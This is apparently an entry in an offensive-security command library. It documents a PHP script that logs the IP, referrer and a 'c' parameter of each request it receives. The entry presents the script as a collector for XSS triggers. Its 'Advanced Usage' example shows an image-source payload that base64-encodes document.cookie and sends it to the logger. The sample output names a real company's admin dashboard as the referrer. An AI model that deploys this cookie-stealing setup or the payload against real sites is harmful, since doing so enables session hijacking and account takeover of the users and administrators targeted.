---
id: cmd-php-zomato-logger
data: |-
  <?php
  $time = date('Y-m-d H:i:s');
  $ip = $_SERVER['REMOTE_ADDR'];
  $referer = $_SERVER['HTTP_REFERER'] ?? 'unknown';
  $c = $_GET['c'] ?? 'unknown';
  $log = "[$time] IP: $ip | Referer: $referer | Param c: $c\n";
  file_put_contents('log.txt', $log, FILE_APPEND);
  ?>
tags:
  - logging
  - php
type: command
output: null
executor: php
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:55:38.108Z'
verified: false
validated: true
submitted: true
---
# php-zomato-logger

## Command

```php
<?php
$time = date('Y-m-d H:i:s');
$ip = $_SERVER['REMOTE_ADDR'];
$referer = $_SERVER['HTTP_REFERER'] ?? 'unknown';
$c = $_GET['c'] ?? 'unknown';
$log = "[$time] IP: $ip | Referer: $referer | Param c: $c\n";
file_put_contents('log.txt', $log, FILE_APPEND);
?>
```

## Description

This PHP script logs details of incoming GET requests to a file log.txt, used to capture XSS triggers by recording timestamp, client IP, HTTP referrer, and a custom parameter 'c'. It runs silently on web access, appending to the log without output.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `$_GET['c']` | Custom parameter from URL query (e.g., ?c=zomato_xss) | No |
| `$_SERVER['REMOTE_ADDR']` | Automatically captures client IP | Yes (implicit) |
| `$_SERVER['HTTP_REFERER']` | Automatically captures referring URL | No |

## Examples

### Basic Usage

Access via browser: http://server/zomato.php?c=test

### Advanced Usage

Integrate in img src for XSS: src="http://server/zomato.php?c="+btoa(document.cookie)

## Expected Output

No console output; instead, appends to log.txt: [2023-10-01 12:00:00] IP: 192.168.1.1 | Referer: https://admin.zomato.com/dashboard | Param c: zomato_xss

## Related

- [[Related Procedure|procedures/Set-Up-PHP-Logging-Server-for-XSS-Capture]]
